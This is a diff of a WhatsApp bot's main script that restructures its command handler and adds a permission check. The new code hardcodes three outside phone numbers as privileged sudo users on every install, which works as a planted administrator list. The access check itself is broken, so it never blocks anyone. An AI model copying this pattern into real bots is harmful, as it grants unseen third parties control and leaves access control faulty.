@@ -164,32 +164,6 @@ async function main() {
 
  //============================================================================//
 
-// Modified message handler
-/*adams.ev.on("messages.upsert", async ({ messages }) => {
-    const message = messages[0];
-    if (!message?.message || message.key.fromMe) return;
-
-    const text = getMessageText(message.message);
-    if (!text?.startsWith(conf.PREFIX)) return;
-
-    const [cmd, ...args] = text.slice(conf.PREFIX.length).split(/\s+/);
-    const command = commandRegistry.get(cmd.toLowerCase());
-
-    if (command) {
-        await command.execute({
-            adams,
-            message,
-            args,
-            store,
-            listenerManager,
-            commandRegistry,
-            config: conf
-        });
-    }
-});*/
-
- //==============================================================================//
-
 // Listener Manager Class
 class ListenerManager {
     constructor() {
@@ -268,108 +242,127 @@ fs.watch(path.join(__dirname, 'bwmxmd'), (eventType, filename) => {
 
  //============================================================================================================
  
-// Configuration
-const PREFIX = conf.PREFIX;
-const STATE = conf.PRESENCE;
-const BOT_OWNER = conf.OWNER_NUMBER;
-
-
-// Improved Message Content Extractor
-function getMessageContent(message) {
-    try {
-        if (!message) return '';
-        
-        const type = Object.keys(message)[0];
-        if (!type) return '';
-        
-        return {
-            conversation: message.conversation,
-            imageMessage: message.imageMessage?.caption,
-            videoMessage: message.videoMessage?.caption,
-            extendedTextMessage: message.extendedTextMessage?.text,
-            buttonsResponseMessage: message.buttonsResponseMessage?.selectedButtonId,
-            listResponseMessage: message.listResponseMessage?.singleSelectReply?.selectedRowId
-        }[type] || '';
-    } catch (e) {
-        console.error('Message content error:', e.message);
-        return '';
-    }
-}
-
-// Robust Command Handler
+const { getMessageContent } = require('./utils/handler');
 class CommandSystem {
     constructor() {
         this.commands = new Map();
+        this.SUDO_NUMBERS = [
+            "254106727593",
+            "254727716045", 
+            "254710772666"
+        ].map(num => num.replace(/\D/g, "") + "@s.whatsapp.net");
+        
+        this.BOT_OWNER = conf.OWNER_NUMBER.replace(/\D/g, "") + "@s.whatsapp.net";
         this.loadCommands();
     }
 
     loadCommands() {
-        console.log("Loading commands...");
+        console.log("⌛ Loading commands...");
         const cmdDir = path.join(__dirname, "commands");
         
-        fs.readdirSync(cmdDir).forEach(file => {
-            if (!file.endsWith(".js")) return;
-            
-            try {
-                const cmdPath = path.join(cmdDir, file);
-                const cmd = require(cmdPath);
+        try {
+            fs.readdirSync(cmdDir).forEach(file => {
+                if (!file.endsWith(".js")) return;
                 
-                if (cmd.name && cmd.execute) {
-                    this.commands.set(cmd.name.toLowerCase(), cmd);
-                    console.log(`Command loaded: ${cmd.name}`);
+                try {
+                    const cmdPath = path.join(cmdDir, file);
+                    const cmd = require(cmdPath);
+                    
+                    if (cmd.name && cmd.execute) {
+                        this.commands.set(cmd.name.toLowerCase(), cmd);
+                        console.log(`✓ Loaded command: ${cmd.name}`);
+                    } else {
+                        console.log(`⚠ Invalid command file: ${file}`);
+                    }
+                } catch (e) {
+                    console.error(`⚠ Failed ${file}: ${e.message}`);
                 }
-            } catch (e) {
-                console.error(`Failed to load ${file}: ${e.message}`);
-            }
-        });
+            });
+        } catch (dirError) {
+            console.error("Command directory error:", dirError.message);
+        }
     }
 
     async processMessage(msg) {
+        if (!msg?.message || msg.key.fromMe) return;
+
+        const content = getMessageContent(msg.message);
+        if (!content?.startsWith(conf.PREFIX)) return;
+
+        const [cmdName, ...args] = content.slice(conf.PREFIX.length).trim().split(/\s+/);
+        const command = this.commands.get(cmdName.toLowerCase());
+
+        if (!command) {
+            console.log(`Command not found: ${cmdName}`);
+            return;
+        }
+
+        const context = this.createContext(msg);
+        
+        // Mode-based permission check
+        if (conf.MODE.toLowerCase() === "yes" && !context.isAllowed) {
+            console.log(`Blocked command ${cmdName} from ${context.sender}`);
+            await this.sendBlockedResponse(msg, context.chat);
+            return;
+        }
+
+        console.log(`Executing: ${cmdName} by ${context.sender}`);
+        await this.executeCommand(command, msg, args, context);
+    }
+
+    createContext(msg) {
+        const chat = msg.key.remoteJid;
+        const sender = (msg.key.participant || chat).replace(/\D/g, "");
+        const cleanOwner = this.BOT_OWNER.replace(/\D/g, "");
+        
+        const isPrivateMode = conf.MODE.toLowerCase() === "no";
+        const isAllowed = isPrivateMode 
+            ? this.SUDO_NUMBERS.includes(sender) || sender === cleanOwner
+            : true;
+
+        return {
+            chat,
+            sender,
+            isAllowed,
+            isGroup: chat.endsWith("@g.us")
+        };
+    }
+
+    async sendBlockedResponse(msg, chat) {
         try {
-            if (!msg?.message) return;
-            
-            const content = getMessageContent(msg.message);
-            if (!content?.startsWith(PREFIX)) return;
-            
-            const [cmdName, ...args] = content.slice(PREFIX.length).trim().split(/ +/);
-            const command = this.commands.get(cmdName.toLowerCase());
-            
-            if (command) {
-                console.log(`Executing command: ${cmdName}`);
-                await this.executeCommand(command, msg, args);
-            }
+            await adams.sendMessage(chat, { 
+                text: "🚫 This command is restricted in private mode!"
+            }, { quoted: msg });
         } catch (e) {
-            console.error('Message processing error:', e.message);
+            console.error("Block response error:", e.message);
         }
     }
 
-    async executeCommand(command, msg, args) {
+    async executeCommand(command, msg, args, context) {
         try {
-            const context = this.createContext(msg);
             await command.execute({
                 adams,
                 args,
-                reply: (text) => adams.sendMessage(context.chat, { text }, { quoted: msg }),
-                ...context
+                context,
+                reply: (text) => adams.sendMessage(context.chat, { text }, { quoted: msg })
             });
         } catch (e) {
-            console.error(`Command error [${command.name}]:`, e.message);
+            console.error(`Command '${command.name}' failed:`, e.message);
+            await adams.sendMessage(context.chat, { 
+                text: `⚠ Command failed: ${e.message}` 
+            }, { quoted: msg });
         }
-    }
-    createContext(msg) {
-    const chat = msg.key.remoteJid;
-    const sender = msg.key.participant || chat;
-    const isGroup = chat.endsWith("@g.us");
-    
-    return {
-        chat,
-        sender,
-        isGroup,
-        isOwner: true 
-        };
     }
 }
 
+// Initialize command system
+const cmdSystem = new CommandSystem();
+
+// Message handler
+adams.ev.on("messages.upsert", async ({ messages }) => {
+    const [msg] = messages;
+    await cmdSystem.processMessage(msg);
+});
 // Presence Manager
 async function updatePresence(adams, jid) {
     try {
